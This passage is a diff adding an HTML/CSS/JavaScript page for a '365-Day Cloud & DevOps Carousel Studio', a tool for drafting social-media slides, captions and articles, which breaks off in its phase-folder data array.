@@ -1,0 +1,2214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>365-Day Cloud & DevOps Carousel Studio</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-dark: #05070D;
+      --bg-card: #0A0E18;
+      --bg-surface: #101626;
+      --border: #1E283D;
+      --accent-cyan: #00F5D4;
+      --accent-blue: #00BBF9;
+      --accent-purple: #9B5DE5;
+      --accent-pink: #F15BB5;
+      --accent-amber: #FEE440;
+      --accent-red: #FF5964;
+      --accent-green: #10B981;
+      --text-main: #FFFFFF;
+      --text-muted: #8E9BAE;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-dark);
+      color: var(--text-main);
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      background: rgba(10, 14, 24, 0.9);
+      backdrop-filter: blur(14px);
+      border-bottom: 1px solid var(--border);
+      padding: 12px 24px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .logo-badge {
+      background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
+      color: #030712;
+      font-weight: 900;
+      font-size: 12px;
+      padding: 5px 10px;
+      border-radius: 6px;
+      letter-spacing: 1px;
+    }
+
+    .brand h1 {
+      font-size: 16px;
+      font-weight: 800;
+      letter-spacing: -0.3px;
+    }
+
+    .controls {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    select, input, button {
+      font-family: inherit;
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      color: var(--text-main);
+      padding: 7px 12px;
+      border-radius: 8px;
+      font-size: 13px;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    select:focus, input:focus {
+      border-color: var(--accent-cyan);
+    }
+
+    button {
+      cursor: pointer;
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    button:hover {
+      background: #1C2436;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
+      color: #030712;
+      border: none;
+      font-weight: 700;
+    }
+
+    .btn-primary:hover {
+      filter: brightness(1.15);
+      box-shadow: 0 4px 14px rgba(0, 245, 212, 0.3);
+    }
+
+    .btn-caption {
+      background: linear-gradient(135deg, var(--accent-pink), var(--accent-purple));
+      color: #FFF;
+      border: none;
+      font-weight: 700;
+    }
+
+    .btn-caption:hover {
+      filter: brightness(1.15);
+      box-shadow: 0 4px 14px rgba(241, 91, 181, 0.3);
+    }
+
+    .btn-article {
+      background: linear-gradient(135deg, #F59E0B, #D97706);
+      color: #030712;
+      border: none;
+      font-weight: 700;
+    }
+
+    .btn-article:hover {
+      filter: brightness(1.15);
+      box-shadow: 0 4px 14px rgba(245, 158, 11, 0.35);
+    }
+
+    .btn-outline {
+      background: #0D1322;
+      border: 1px solid var(--border);
+      color: #E2E8F0;
+    }
+
+    .btn-outline:hover {
+      border-color: var(--accent-cyan);
+      background: rgba(0, 245, 212, 0.08);
+      color: var(--accent-cyan);
+    }
+
+    .main-container {
+      display: grid;
+      grid-template-columns: 360px 1fr;
+      flex: 1;
+    }
+
+    /* Sidebar & Folder Tree */
+    .sidebar {
+      background: var(--bg-card);
+      border-right: 1px solid var(--border);
+      overflow-y: auto;
+      height: calc(100vh - 61px);
+      padding: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .tree-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 8px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .tree-header-title {
+      font-size: 11px;
+      font-weight: 800;
+      color: #94A3B8;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .tree-header-actions {
+      display: flex;
+      gap: 6px;
+    }
+
+    .tree-header-actions button {
+      font-size: 10px;
+      padding: 3px 8px;
+      background: #1A2234;
+      border-radius: 4px;
+    }
+
+    .day-list {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    /* Phase Folder */
+    .phase-folder {
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background: #070A12;
+      overflow: hidden;
+      transition: all 0.2s ease;
+    }
+
+    .phase-folder.active-phase {
+      border-color: rgba(0, 245, 212, 0.4);
+    }
+
+    .phase-header {
+      padding: 9px 12px;
+      background: rgba(16, 22, 38, 0.7);
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 12px;
+      font-weight: 700;
+      user-select: none;
+      transition: background 0.15s ease;
+    }
+
+    .phase-header:hover {
+      background: rgba(28, 36, 54, 0.9);
+    }
+
+    .phase-title-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #F1F5F9;
+    }
+
+    .folder-arrow {
+      font-size: 10px;
+      color: var(--accent-cyan);
+      transition: transform 0.2s ease;
+      display: inline-block;
+      width: 12px;
+    }
+
+    .phase-folder.collapsed .folder-arrow {
+      transform: rotate(-90deg);
+    }
+
+    .phase-folder.collapsed .phase-content {
+      display: none;
+    }
+
+    .folder-badge {
+      font-size: 10px;
+      font-family: 'Fira Code', monospace;
+      padding: 2px 6px;
+      border-radius: 4px;
+      background: rgba(155, 93, 229, 0.2);
+      color: var(--accent-purple);
+      font-weight: 600;
+    }
+
+    .phase-content {
+      padding: 6px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    /* Sub-Folder */
+    .sub-folder {
+      border-left: 2px solid #1E283D;
+      margin-left: 6px;
+      padding-left: 8px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .sub-folder-header {
+      padding: 6px 8px;
+      font-size: 11px;
+      font-weight: 600;
+      color: #94A3B8;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-radius: 6px;
+      user-select: none;
+    }
+
+    .sub-folder-header:hover {
+      background: #141A26;
+      color: #FFF;
+    }
+
+    .sub-folder.collapsed .sub-content {
+      display: none;
+    }
+
+    .sub-folder.collapsed .folder-arrow {
+      transform: rotate(-90deg);
+    }
+
+    .sub-content {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      padding: 4px 0;
+    }
+
+    /* Day Item File Node */
+    .day-item {
+      padding: 7px 10px;
+      border-radius: 6px;
+      border: 1px solid transparent;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      gap: 3px;
+      background: #0B0F19;
+      transition: all 0.15s ease;
+    }
+
+    .day-item:hover {
+      background: #161F30;
+    }
+
+    .day-item.active {
+      background: rgba(0, 245, 212, 0.1);
+      border-color: var(--accent-cyan);
+    }
+
+    .day-item-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 10px;
+      color: var(--text-muted);
+      font-family: 'Fira Code', monospace;
+    }
+
+    .day-item-title {
+      font-size: 12px;
+      font-weight: 600;
+      color: #E2E8F0;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .day-item.active .day-item-title {
+      color: #FFF;
+      font-weight: 700;
+    }
+
+    /* Content Area */
+    .content-area {
+      padding: 24px 28px;
+      overflow-y: auto;
+      height: calc(100vh - 61px);
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+
+    .day-overview {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 20px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    }
+
+    .day-meta h2 {
+      font-size: 20px;
+      font-weight: 800;
+      margin-bottom: 8px;
+      letter-spacing: -0.4px;
+    }
+
+    .day-badges {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 10px;
+      flex-wrap: wrap;
+    }
+
+    .badge {
+      font-size: 11px;
+      padding: 3px 9px;
+      border-radius: 20px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .badge-phase {
+      background: rgba(155, 93, 229, 0.15);
+      color: var(--accent-purple);
+      border: 1px solid rgba(155, 93, 229, 0.3);
+    }
+
+    .badge-pillar {
+      background: rgba(0, 245, 212, 0.15);
+      color: var(--accent-cyan);
+      border: 1px solid rgba(0, 245, 212, 0.3);
+    }
+
+    .day-hook {
+      font-style: italic;
+      color: var(--text-muted);
+      font-size: 13.5px;
+      border-left: 3px solid var(--accent-cyan);
+      padding-left: 12px;
+      max-width: 780px;
+      line-height: 1.5;
+    }
+
+    .day-actions {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      min-width: 220px;
+    }
+
+    /* Carousel Slides Preview Grid */
+    .carousel-section-title {
+      font-size: 14px;
+      font-weight: 800;
+      color: #CBD5E1;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding-bottom: 4px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .slides-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 18px;
+    }
+
+    /* Modern Figma-Grade Slide Card */
+    .slide-wrapper {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .slide-card {
+      aspect-ratio: 1 / 1;
+      background: radial-gradient(circle at top right, #0F172A 0%, #060810 100%);
+      border: 1px solid #1E293B;
+      border-radius: 14px;
+      padding: 22px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.6);
+      transition: all 0.25s ease;
+    }
+
+    .slide-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: linear-gradient(90deg, var(--accent-cyan), var(--accent-purple));
+      opacity: 0.7;
+    }
+
+    .slide-card:hover {
+      transform: translateY(-5px);
+      border-color: var(--accent-cyan);
+      box-shadow: 0 16px 40px rgba(0, 245, 212, 0.15);
+    }
+
+    .slide-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .slide-tag {
+      font-size: 10px;
+      font-family: 'Fira Code', monospace;
+      color: var(--accent-cyan);
+      background: rgba(0, 245, 212, 0.1);
+      border: 1px solid rgba(0, 245, 212, 0.2);
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+
+    .slide-num-badge {
+      font-size: 10px;
+      font-family: 'Fira Code', monospace;
+      color: var(--text-muted);
+      background: #131A29;
+      padding: 2px 7px;
+      border-radius: 12px;
+    }
+
+    .slide-body {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      gap: 12px;
+      margin: 10px 0;
+    }
+
+    .slide-title {
+      font-size: 16px;
+      font-weight: 800;
+      line-height: 1.25;
+      letter-spacing: -0.3px;
+      color: #FFFFFF;
+    }
+
+    .slide-text {
+      font-size: 12px;
+      color: #94A3B8;
+      line-height: 1.5;
+    }
+
+    /* Realistic macOS Terminal Container */
+    .slide-terminal {
+      background: #04060C;
+      border: 1px solid #1E283D;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.5);
+    }
+
+    .terminal-bar {
+      background: #0D1322;
+      padding: 5px 8px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      border-bottom: 1px solid #1A2234;
+    }
+
+    .terminal-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+    }
+    .dot-red { background: #FF5F56; }
+    .dot-yellow { background: #FFBD2E; }
+    .dot-green { background: #27C93F; }
+
+    .terminal-title {
+      font-size: 9px;
+      font-family: 'Fira Code', monospace;
+      color: #64748B;
+      margin-left: auto;
+    }
+
+    .terminal-content {
+      padding: 10px;
+      font-family: 'Fira Code', monospace;
+      font-size: 11px;
+      color: #38BDF8;
+      line-height: 1.5;
+      white-space: pre-wrap;
+      overflow-x: auto;
+    }
+
+    .slide-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .slide-list-item {
+      background: rgba(16, 22, 38, 0.6);
+      border: 1px solid #1C263C;
+      border-radius: 6px;
+      padding: 6px 10px;
+      font-size: 11.5px;
+      color: #E2E8F0;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .slide-list-item::before {
+      content: "✓";
+      color: var(--accent-cyan);
+      font-weight: 900;
+      font-size: 11px;
+    }
+
+    .slide-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-top: 1px solid rgba(255, 255, 255, 0.08);
+      padding-top: 10px;
+      font-size: 10px;
+      color: #64748B;
+    }
+
+    .slide-footer-brand {
+      font-weight: 800;
+      color: #CBD5E1;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      letter-spacing: 0.5px;
+    }
+
+    .slide-download-btn {
+      width: 100%;
+      justify-content: center;
+      font-size: 11px;
+      padding: 8px;
+      background: #0E1524;
+      border-color: #1E293B;
+    }
+
+    .slide-download-btn:hover {
+      background: var(--accent-cyan);
+      color: #030712;
+      font-weight: 700;
+    }
+
+    /* Publishing Panels */
+    .publishing-suite {
+      display: grid;
+      grid-template-columns: 1.15fr 1fr;
+      gap: 20px;
+    }
+
+    .post-panel {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .post-panel-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    .post-panel-title {
+      font-size: 14px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .platform-tabs {
+      display: flex;
+      gap: 6px;
+      background: #070A12;
+      padding: 3px;
+      border-radius: 6px;
+      border: 1px solid var(--border);
+    }
+
+    .platform-tab-btn {
+      background: transparent;
+      border: none;
+      font-size: 11px;
+      padding: 4px 10px;
+      border-radius: 4px;
+      color: #94A3B8;
+      cursor: pointer;
+      font-weight: 600;
+      transition: all 0.15s ease;
+    }
+
+    .platform-tab-btn.active {
+      background: #1E293B;
+      color: var(--accent-cyan);
+    }
+
+    .caption-meta-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 11px;
+      color: var(--text-muted);
+      font-family: 'Fira Code', monospace;
+      padding: 0 4px;
+    }
+
+    .caption-textarea {
+      width: 100%;
+      height: 240px;
+      background: #05070D;
+      border: 1px solid #1E293B;
+      border-radius: 8px;
+      padding: 14px;
+      font-size: 13px;
+      line-height: 1.6;
+      color: #F1F5F9;
+      resize: vertical;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    .caption-textarea:focus {
+      border-color: var(--accent-cyan);
+    }
+
+    .hashtags-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-top: 4px;
+    }
+
+    .hashtag-pill {
+      background: rgba(0, 245, 212, 0.1);
+      border: 1px solid rgba(0, 245, 212, 0.2);
+      color: var(--accent-cyan);
+      font-size: 11px;
+      font-weight: 600;
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-family: 'Fira Code', monospace;
+      cursor: pointer;
+      transition: background 0.15s ease;
+    }
+
+    .hashtag-pill:hover {
+      background: rgba(0, 245, 212, 0.2);
+    }
+
+    .networking-box {
+      background: rgba(155, 93, 229, 0.08);
+      border: 1px solid rgba(155, 93, 229, 0.25);
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 12px;
+      color: #E2E8F0;
+      line-height: 1.5;
+    }
+
+    .toast-msg {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
+      color: #030712;
+      padding: 10px 18px;
+      border-radius: 8px;
+      font-weight: 800;
+      font-size: 13px;
+      box-shadow: 0 10px 30px rgba(0, 245, 212, 0.4);
+      z-index: 1000;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: all 0.25s ease;
+      pointer-events: none;
+    }
+
+    .toast-msg.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    /* Article Studio Section */
+    .article-section {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 22px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      margin-top: 24px;
+    }
+
+    .article-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 12px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .article-title-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .article-badge {
+      background: rgba(245, 158, 11, 0.15);
+      color: #FBBF24;
+      border: 1px solid rgba(245, 158, 11, 0.3);
+      font-size: 11px;
+      font-weight: 800;
+      padding: 3px 8px;
+      border-radius: 4px;
+      letter-spacing: 0.5px;
+    }
+
+    .article-view-toggle {
+      display: flex;
+      gap: 4px;
+      background: #070A12;
+      padding: 3px;
+      border-radius: 6px;
+      border: 1px solid var(--border);
+    }
+
+    .article-view-btn {
+      background: transparent;
+      border: none;
+      font-size: 11px;
+      padding: 4px 10px;
+      border-radius: 4px;
+      color: #94A3B8;
+      cursor: pointer;
+      font-weight: 600;
+      transition: all 0.15s ease;
+    }
+
+    .article-view-btn.active {
+      background: #1E293B;
+      color: #FBBF24;
+    }
+
+    .article-meta-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 11px;
+      color: var(--text-muted);
+      font-family: 'Fira Code', monospace;
+      padding: 0 4px;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    .article-content-container {
+      position: relative;
+      min-height: 480px;
+    }
+
+    .article-textarea {
+      width: 100%;
+      height: 520px;
+      background: #05070D;
+      border: 1px solid #1E293B;
+      border-radius: 8px;
+      padding: 16px;
+      font-size: 13px;
+      line-height: 1.6;
+      color: #F1F5F9;
+      resize: vertical;
+      font-family: 'Fira Code', monospace;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    .article-textarea:focus {
+      border-color: #F59E0B;
+    }
+
+    .article-preview-rendered {
+      width: 100%;
+      max-height: 580px;
+      overflow-y: auto;
+      background: #080C16;
+      border: 1px solid #1E293B;
+      border-radius: 8px;
+      padding: 24px 28px;
+      font-size: 14.5px;
+      line-height: 1.7;
+      color: #CBD5E1;
+      display: none;
+    }
+
+    .article-preview-rendered h1 {
+      font-size: 22px;
+      color: #FFFFFF;
+      font-weight: 800;
+      margin: 16px 0 12px 0;
+      border-bottom: 1px solid #1E293B;
+      padding-bottom: 8px;
+    }
+
+    .article-preview-rendered h2 {
+      font-size: 18px;
+      color: var(--accent-cyan);
+      font-weight: 700;
+      margin: 20px 0 10px 0;
+    }
+
+    .article-preview-rendered h3 {
+      font-size: 15px;
+      color: var(--accent-blue);
+      font-weight: 700;
+      margin: 14px 0 8px 0;
+    }
+
+    .article-preview-rendered p {
+      margin-bottom: 12px;
+    }
+
+    .article-preview-rendered blockquote {
+      border-left: 3px solid #F59E0B;
+      background: rgba(245, 158, 11, 0.08);
+      padding: 10px 16px;
+      margin: 14px 0;
+      border-radius: 0 6px 6px 0;
+      font-style: italic;
+      color: #F1F5F9;
+    }
+
+    .article-preview-rendered pre {
+      background: #030509;
+      border: 1px solid #1A2338;
+      border-radius: 8px;
+      padding: 14px;
+      overflow-x: auto;
+      font-family: 'Fira Code', monospace;
+      font-size: 12px;
+      color: #38BDF8;
+      margin: 14px 0;
+    }
+
+    .article-preview-rendered code {
+      font-family: 'Fira Code', monospace;
+      font-size: 12px;
+      background: rgba(255, 255, 255, 0.08);
+      padding: 2px 6px;
+      border-radius: 4px;
+      color: var(--accent-cyan);
+    }
+
+    .article-preview-rendered pre code {
+      background: transparent;
+      padding: 0;
+      color: inherit;
+    }
+
+    .article-preview-rendered ul, .article-preview-rendered ol {
+      margin-left: 22px;
+      margin-bottom: 12px;
+    }
+
+    .article-preview-rendered li {
+      margin-bottom: 6px;
+    }
+
+    .article-preview-rendered hr {
+      border: 0;
+      height: 1px;
+      background: #1E293B;
+      margin: 22px 0;
+    }
+
+    .article-preview-rendered table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 16px 0;
+      font-size: 13px;
+    }
+
+    .article-preview-rendered th, .article-preview-rendered td {
+      border: 1px solid #1E293B;
+      padding: 8px 12px;
+      text-align: left;
+    }
+
+    .article-preview-rendered th {
+      background: #0F172A;
+      color: #FFFFFF;
+      font-weight: 700;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="brand">
+      <div class="logo-badge">365 DEVOPS</div>
+      <h1>Visual Carousel Studio + Multi-Platform Caption Suite</h1>
+    </div>
+    <div class="controls">
+      <input type="text" id="searchInput" placeholder="Search topics (e.g. Linux, K8s, Docker)..." style="width: 240px;">
+      <button id="prevBtn">← Prev</button>
+      <button id="nextBtn">Next →</button>
+      <button class="btn-caption" id="copyCaptionHeaderBtn">📱 Copy Caption</button>
+      <button class="btn-article" id="copyArticleHeaderBtn">📰 Copy Article (.md)</button>
+      <button class="btn-outline" id="downloadArticleHeaderBtn">⬇ Article (.md)</button>
+      <button class="btn-primary" id="downloadAllSlidesBtn">⚡ 5 Slides (1080p)</button>
+    </div>
+  </header>
+
+  <div class="main-container">
+    <!-- Folder Tree Sidebar -->
+    <div class="sidebar">
+      <div class="tree-header">
+        <span class="tree-header-title">📁 PHASES & REPO FOLDERS</span>
+        <div class="tree-header-actions">
+          <button id="expandAllBtn">Expand All</button>
+          <button id="collapseAllBtn">Collapse</button>
+        </div>
+      </div>
+      <div class="day-list" id="dayListContainer"></div>
+    </div>
+
+    <!-- Main Content Workspace -->
+    <div class="content-area">
+      <div class="day-overview">
+        <div class="day-meta">
+          <div class="day-badges">
+            <span class="badge badge-phase" id="phaseBadge">Phase 1: Foundation</span>
+            <span class="badge badge-pillar" id="pillarBadge">Teach / Systems</span>
+            <span class="badge" style="background: rgba(0, 187, 249, 0.15); color: #00BBF9;" id="dateBadge">Day 004</span>
+          </div>
+          <h2 id="dayTitle">Why chmod 777 is an Engineering Red Flag</h2>
+          <div class="day-hook" id="dayHook">"If your answer to a 'Permission Denied' error is chmod 777, you didn't fix the problem. You just created a massive security vulnerability."</div>
+        </div>
+        <div class="day-actions">
+          <button class="btn-caption" id="quickCopyCaptionBtn">📱 Copy Active Caption</button>
+          <button class="btn-primary" id="copyPostBtn">💼 Copy LinkedIn Post</button>
+          <button class="btn-article" id="copyArticleDayBtn">📰 Copy Article (.md)</button>
+          <button class="btn-outline" id="downloadArticleDayBtn">⬇ Download Article (.md)</button>
+        </div>
+      </div>
+
+      <div>
+        <div class="carousel-section-title">
+          <span>HIGH-RESOLUTION 1080 × 1080 CAROUSEL SLIDES (PNG EXPORT READY)</span>
+          <span style="font-size: 12px; color: var(--accent-cyan); font-weight: 600;">✨ Multi-Layer Mesh Gradient + Terminal Syntax Engine</span>
+        </div>
+      </div>
+
+      <div class="slides-grid" id="slidesContainer">
+        <!-- 5 Slides injected dynamically -->
+      </div>
+
+      <!-- Side-by-Side Publishing Panels -->
+      <div class="publishing-suite">
+        <!-- Panel 1: Multi-Platform Social Caption Suite -->
+        <div class="post-panel">
+          <div class="post-panel-header">
+            <div class="post-panel-title">
+              <span>📱 Multi-Platform Caption Suite</span>
+            </div>
+            <div class="platform-tabs">
+              <button class="platform-tab-btn active" id="tabInstagramBtn" onclick="switchPlatformTab('instagram')">📸 Instagram / Threads</button>
+              <button class="platform-tab-btn" id="tabTwitterBtn" onclick="switchPlatformTab('twitter')">🐦 X / Twitter</button>
+              <button class="platform-tab-btn" id="tabShortBtn" onclick="switchPlatformTab('short')">⚡ Punchy Hook</button>
+            </div>
+            <button style="font-size: 11px; padding: 4px 10px;" class="btn-caption" id="copyCaptionBoxBtn">📋 Copy Caption</button>
+          </div>
+
+          <div class="caption-meta-bar">
+            <span id="captionPlatformLabel">Platform: Instagram / Threads (Carousel Focus)</span>
+            <span id="captionCharCount">0 chars • 0 words</span>
+          </div>
+
+          <textarea class="caption-textarea" id="captionTextarea"></textarea>
+
+          <div>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
+              <span style="font-size: 11px; font-weight: 700; color: var(--text-muted);">HASHTAGS:</span>
+              <button style="font-size: 10px; padding: 2px 6px;" id="copyHashtagsBtn">Copy Tags</button>
+            </div>
+            <div class="hashtags-row" id="hashtagsContainer"></div>
+          </div>
+
+          <div class="networking-box" id="networkingPreview"></div>
+        </div>
+
+        <!-- Panel 2: Full Educational Post (LinkedIn) -->
+        <div class="post-panel">
+          <div class="post-panel-header">
+            <div class="post-panel-title">
+              <span>💼 LinkedIn Long-Form Post</span>
+            </div>
+            <button style="font-size: 11px; padding: 4px 10px;" class="btn-primary" id="copyPostTextBtn">📋 Copy LinkedIn Post</button>
+          </div>
+          <div class="caption-meta-bar">
+            <span>Full Post Structure (Hook + Breakdown + Rules + CTA)</span>
+            <span id="postCharCount">0 chars</span>
+          </div>
+          <textarea class="caption-textarea" id="postTextPreview" style="height: 380px;"></textarea>
+        </div>
+      </div>
+
+      <!-- Long-Form Technical Article Studio (Dev.to / Medium / Blog) -->
+      <div class="article-section">
+        <div class="article-header">
+          <div class="article-title-row">
+            <span class="article-badge">📰 LONG-FORM TECHNICAL ARTICLE</span>
+            <h3 style="font-size: 15px; font-weight: 800; color: #FFFFFF;" id="articleHeadlineTitle">Dev.to & Medium Deep Dive Article</h3>
+          </div>
+          <div class="controls" style="margin: 0;">
+            <div class="article-view-toggle">
+              <button class="article-view-btn active" id="articleRawTabBtn" onclick="switchArticleView('raw')">Raw Markdown</button>
+              <button class="article-view-btn" id="articlePreviewTabBtn" onclick="switchArticleView('preview')">Formatted Preview</button>
+            </div>
+            <button class="btn-article" id="copyArticleBtn" style="font-size: 11px; padding: 5px 12px;">📋 Copy Article (.md)</button>
+            <button class="btn-outline" id="downloadArticleBtn" style="font-size: 11px; padding: 5px 12px;">⬇ Download (.md)</button>
+          </div>
+        </div>
+
+        <div class="article-meta-bar">
+          <span id="articlePlatformLabel">Ready for: Dev.to • Medium • Hashnode • Substack • Hugo / Astro</span>
+          <span id="articleMetrics">⏱ ~7 min read • 1,450 words • 8,200 chars</span>
+        </div>
+
+        <div class="article-content-container">
+          <textarea class="article-textarea" id="articleTextarea" spellcheck="false"></textarea>
+          <div class="article-preview-rendered" id="articleRenderedPreview"></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="toast-msg" id="toastMsg">✅ Copied to clipboard!</div>
+
+  <script>
+    const FOLDER_TREE = [
+      {
+        id: "phase_1",
+        folderName: "01_PHASE_1_FOUNDATION",
+        displayName: "Phase 1: Foundation (Days 001–030)",
+        range: [1, 30],
+        subfolders: [
+          { id: "p1_w1", name: "Week 01 (Days 001–007)", range: [1, 7] },
+          { id: "p1_w2", name: "Week 02 (Days 008–014)", range: [8, 14] },
+          { id: "p1_w3", name: "Week 03 (Days 015–021)", range: [15, 21] },
+          { id: "p1_w4", name: "Week 04 (Days 022–030)", range: [22, 30] }
+        ]
+      },
+      {
+        id: "phase_2",
+        folderName: "02_PHASE_2_KNOWLEDGE",
+        displayName: "Phase 2: Knowledge (Days 031–090)",
+        range: [31, 90],
+        subfolders: [
+          { id: "p2_m2", name: "Month 02: Containers & K8s (031–060)", range: [31, 60] },
+          { id: "p2_m3", name: "Month 03: Terraform & AWS (061–090)", range: [61, 90] }
+        ]
+      },
+      {
+        id: "phase_3",
+        folderName: "03_PHASE_3_BUILD_IN_PUBLIC",
+        displayName: "Phase 3: Build in Public (Days 091–180)",
+        range: [91, 180],
+        subfolders: [
+          { id: "p3_m4", name: "Month 04: Project 1 Supply Chain (091–120)", range: [91, 120] },
+          { id: "p3_m5", name: "Month 05: Project 2 GitOps K8s (121–150)", range: [121, 150] },
+          { id: "p3_m6", name: "Month 06: Project 3 AWS Suite (151–180)", range: [151, 180] }
+        ]
+      },
+      {
+        id: "phase_4",
+        folderName: "04_PHASE_4_AUTHORITY_NETWORK",
+        displayName: "Phase 4: Authority & Network (Days 181–270)",
+        range: [181, 270],
+        subfolders: [
+          { id: "p4_m7", name: "Month 07: SRE & Observability (181–210)", range: [181, 210] },
+          { id: "p4_m8", name: "Month 08: Zero-Trust Security (211–240)", range: [211, 240] },
+          { id: "p4_m9", name: "Month 09: eBPF & Go Operator (241–270)", range: [241, 270] }
+        ]
+      },
+      {
+        id: "phase_5",
+        folderName: "05_PHASE_5_CAREER_VISIBILITY",
+        displayName: "Phase 5: Career Visibility (Days 271–330)",
+        range: [271, 330],
+        subfolders: [
+          { id: "p5_m10", name: "Month 10: System Design & Scale (271–300)", range: [271, 300] },
+          { id: "p5_m11", name: "Month 11: Production Readiness (301–330)", range: [301, 330] }
+        ]
+      },
+      {
+        id: "phase_6",
+        folderName: "06_PHASE_6_REPUTATION_OPPORTUNITY",
+        displayName: "Phase 6: Reputation & Opportunity (331–365)",
+        range: [331, 365],
+        subfolders: [
